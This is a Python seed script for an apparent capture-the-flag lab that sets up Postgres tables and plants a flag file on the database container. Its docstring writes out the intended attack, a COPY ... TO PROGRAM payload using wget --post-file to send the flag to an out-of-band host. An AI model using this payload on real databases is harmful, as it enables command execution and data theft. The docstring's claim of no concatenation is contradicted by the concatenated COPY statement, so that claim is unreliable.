# SPDX-License-Identifier: MIT
"""Wait for Postgres, seed the schema, and PLANT the flag on the Postgres
container's filesystem via a superuser COPY ... TO write. The flag is derived
app-side from LAB_USER_SECRET, so the raw secret NEVER reaches Postgres.

Seed also loads the vulnerable audit_log with one benign row. The intended RCE
payload writes into `audit_log` first (via psql-planted content — see SOLUTION),
or more commonly reads /labflag/flag.txt via COPY audit_log TO PROGRAM 'wget
--post-file=/labflag/flag.txt http://oob:9000/x'. The whole seed uses parameters
+ COPY (SELECT literal) — never concatenation.
"""
import asyncio  # noqa: F401 -- kept for parity with other labs; unused here
import os
import time

import psycopg2

DB = {
    "host": os.environ.get("DB_HOST", "db"),
    "port": int(os.environ.get("DB_PORT", "5432")),
    "dbname": os.environ.get("DB_NAME", "ems"),
    "user": os.environ.get("DB_USER", "emsapp"),
    "password": os.environ.get("DB_PASSWORD", ""),
}
FLAG_PATH = os.environ.get("FLAG_PATH", "/var/lib/lab/flag.txt")
PG_FLAG_PATH = os.environ.get("PG_FLAG_PATH", "/labflag/flag.txt")


def connect_with_retry():
    for attempt in range(60):
        try:
            conn = psycopg2.connect(connect_timeout=5, **DB)
            conn.autocommit = True
            return conn
        except Exception:  # noqa: BLE001 -- transient startup errors
            if attempt == 0:
                print("[seed] waiting for database...", flush=True)
            time.sleep(1)
    raise SystemExit("[seed] database never became ready")


def main() -> None:
    conn = connect_with_retry()
    try:
        with conn.cursor() as cur:
            cur.execute(
                "CREATE TABLE IF NOT EXISTS devices ("
                "  id SERIAL PRIMARY KEY,"
                "  fctuid TEXT NOT NULL,"
                "  hostname TEXT NOT NULL,"
                "  registered_at TIMESTAMPTZ NOT NULL DEFAULT now())"
            )
            cur.execute(
                "CREATE TABLE IF NOT EXISTS audit_log ("
                "  id SERIAL PRIMARY KEY,"
                "  entry TEXT NOT NULL,"
                "  created_at TIMESTAMPTZ NOT NULL DEFAULT now())"
            )
            cur.execute("SELECT COUNT(*) FROM devices")
            if cur.fetchone()[0] == 0:
                cur.executemany(
                    "INSERT INTO devices (fctuid, hostname) VALUES (%s, %s)",
                    [("DEV-000001", "workstation-01"), ("DEV-000002", "workstation-02")],
                )
            cur.execute("SELECT COUNT(*) FROM audit_log")
            if cur.fetchone()[0] == 0:
                cur.executemany(
                    "INSERT INTO audit_log (entry) VALUES (%s)",
                    [("service started",), ("nightly manifest sync",)],
                )

            # Plant the flag on the Postgres container filesystem. FLAG format is
            # FLAG{64 lowercase hex} with no quotes/backslashes, so single-quoting
            # the literal here is safe. COPY (SELECT literal) TO <path> is a
            # superuser server-side file write.
            with open(FLAG_PATH, encoding="utf-8") as fh:
                flag = fh.read().strip()
            cur.execute(
                "COPY (SELECT '" + flag + "') TO '" + PG_FLAG_PATH + "' (FORMAT text)"
            )
        print("[seed] ems store ready; flag planted on the db filesystem", flush=True)
    finally:
        conn.close()


if __name__ == "__main__":
    main()
